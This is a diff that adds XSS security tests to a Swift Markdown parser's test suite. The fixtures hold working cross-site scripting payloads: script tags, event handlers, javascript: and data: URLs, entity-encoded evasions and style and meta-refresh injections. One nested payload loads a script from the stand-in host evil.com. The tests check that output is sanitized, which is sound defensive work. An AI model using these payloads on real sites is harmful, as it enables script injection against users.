@@ -5,10 +5,12 @@ import Markdown
 final class MarkdownParserTests: XCTestCase {
     
     var parser: MarkdownParser!
+    var parserWithSkipValidation: MarkdownParser!
     
     override func setUp() {
         super.setUp()
         parser = MarkdownParser()
+        parserWithSkipValidation = MarkdownParser(skipContentValidation: true)
     }
     
     func testBasicMarkdownParsing() throws {
@@ -251,5 +253,213 @@ final class MarkdownParserTests: XCTestCase {
         measure {
             _ = try? parser.parse(largeMarkdown)
         }
+    }
+    
+    // MARK: - XSS Security Tests
+    
+    func testXSSProtection_BasicScriptTag() throws {
+        let maliciousMarkdown = """
+        # Title
+        
+        <script>alert('XSS')</script>
+        
+        Normal paragraph.
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Script tags should be escaped or removed
+        XCTAssertFalse(html.contains("<script>"))
+        XCTAssertFalse(html.contains("</script>"))
+        XCTAssertTrue(html.contains("&lt;script&gt;") || !html.contains("script"))
+    }
+    
+    func testXSSProtection_EventHandlers() throws {
+        let maliciousMarkdown = """
+        # Title
+        
+        <img src=x onerror="alert('XSS')">
+        <div onclick="alert('XSS')">Click me</div>
+        <a href="#" onmouseover="alert('XSS')">Link</a>
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Event handlers should be removed or escaped
+        XCTAssertFalse(html.contains("onerror="))
+        XCTAssertFalse(html.contains("onclick="))
+        XCTAssertFalse(html.contains("onmouseover="))
+        XCTAssertFalse(html.contains("alert("))
+    }
+    
+    func testXSSProtection_JavaScriptURLs() throws {
+        let maliciousMarkdown = """
+        [Click me](javascript:alert('XSS'))
+        [Data URL](data:text/html,<script>alert('XSS')</script>)
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // JavaScript and data URLs should be sanitized
+        XCTAssertFalse(html.contains("javascript:"))
+        XCTAssertFalse(html.contains("data:text/html"))
+        
+        // Links should either be removed or have safe href
+        if html.contains("href=") {
+            XCTAssertTrue(html.contains("href=\"#\"") || html.contains("href=\"\""))
+        }
+    }
+    
+    func testXSSProtection_EncodingEvasion() throws {
+        let maliciousMarkdown = """
+        # Title
+        
+        <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+        <script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Encoded attacks should be prevented
+        XCTAssertFalse(html.contains("onerror="))
+        XCTAssertFalse(html.contains("<script"))
+        XCTAssertFalse(html.contains("&#97;&#108;&#101;&#114;&#116;"))
+    }
+    
+    func testXSSProtection_AttributeInjection() throws {
+        let maliciousMarkdown = """
+        <img src="valid.jpg" alt="test" src="x" onerror="alert('XSS')">
+        <input type="text" value="test"><script>alert('XSS')</script>">
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Attribute injection should be prevented
+        XCTAssertFalse(html.contains("onerror="))
+        XCTAssertFalse(html.contains("<script"))
+        
+        // If img tag is allowed, it should have safe attributes only
+        if html.contains("<img") {
+            let imgPattern = #"<img[^>]*>"#
+            if let regex = try? NSRegularExpression(pattern: imgPattern),
+               let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)) {
+                let imgTag = String(html[Range(match.range, in: html)!])
+                XCTAssertFalse(imgTag.contains("onerror"))
+            }
+        }
+    }
+    
+    func testXSSProtection_HTML5NewElements() throws {
+        let maliciousMarkdown = """
+        <svg onload="alert('XSS')"></svg>
+        <math><mtext><script>alert('XSS')</script></mtext></math>
+        <iframe src="javascript:alert('XSS')"></iframe>
+        <embed src="data:text/html,<script>alert('XSS')</script>">
+        <object data="javascript:alert('XSS')"></object>
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Dangerous HTML5 elements should be sanitized
+        XCTAssertFalse(html.contains("<svg"))
+        XCTAssertFalse(html.contains("<math"))
+        XCTAssertFalse(html.contains("<iframe"))
+        XCTAssertFalse(html.contains("<embed"))
+        XCTAssertFalse(html.contains("<object"))
+        XCTAssertFalse(html.contains("onload="))
+    }
+    
+    func testXSSProtection_StyleInjection() throws {
+        let maliciousMarkdown = """
+        <style>body { background: url('javascript:alert("XSS")'); }</style>
+        <div style="background: url('javascript:alert(&quot;XSS&quot;)')">Test</div>
+        <link rel="stylesheet" href="javascript:alert('XSS')">
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Style-based XSS should be prevented
+        XCTAssertFalse(html.contains("javascript:"))
+        XCTAssertFalse(html.contains("<style"))
+        
+        // If style attribute is allowed, it should be safe
+        if html.contains("style=") {
+            XCTAssertFalse(html.lowercased().contains("javascript"))
+            XCTAssertFalse(html.lowercased().contains("expression"))
+        }
+    }
+    
+    func testXSSProtection_MetaRefresh() throws {
+        let maliciousMarkdown = """
+        <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+        <meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Meta refresh attacks should be prevented
+        XCTAssertFalse(html.contains("<meta"))
+        XCTAssertFalse(html.contains("http-equiv"))
+        XCTAssertFalse(html.contains("javascript:"))
+        XCTAssertFalse(html.contains("data:"))
+    }
+    
+    func testXSSProtection_ComplexNestedAttack() throws {
+        let maliciousMarkdown = """
+        <div><img src="x" onerror="this.onerror=null;var s=document.createElement('script');s.src='//evil.com/xss.js';document.body.appendChild(s);">
+        <input type="text" onfocus="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+        <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click</a>
+        </div>
+        """
+        
+        let result = try parserWithSkipValidation.parse(maliciousMarkdown)
+        let html = result.renderHTML()
+        
+        // Complex attacks should be prevented
+        XCTAssertFalse(html.contains("onerror="))
+        XCTAssertFalse(html.contains("onfocus="))
+        XCTAssertFalse(html.contains("eval("))
+        XCTAssertFalse(html.contains("document.createElement"))
+        XCTAssertFalse(html.contains("appendChild"))
+        
+        // Encoded JavaScript URLs should be caught
+        XCTAssertFalse(html.contains("&#106;&#97;&#118;&#97;"))
+    }
+    
+    func testXSSProtection_SafeContent() throws {
+        let safeMarkdown = """
+        # Safe Title
+        
+        This is a **safe** paragraph with *emphasis*.
+        
+        [Safe Link](https://example.com)
+        ![Safe Image](image.jpg)
+        
+        ```javascript
+        // Safe code block
+        console.log('Hello');
+        ```
+        
+        - Safe list item 1
+        - Safe list item 2
+        """
+        
+        let result = try parserWithSkipValidation.parse(safeMarkdown)
+        let html = result.renderHTML()
+        
+        // Safe content should be preserved
+        XCTAssertTrue(html.contains("Safe Title"))
+        XCTAssertTrue(html.contains("safe"))
+        XCTAssertTrue(html.contains("emphasis"))
+        XCTAssertTrue(html.contains("https://example.com"))
+        XCTAssertTrue(html.contains("console.log"))
     }
 }
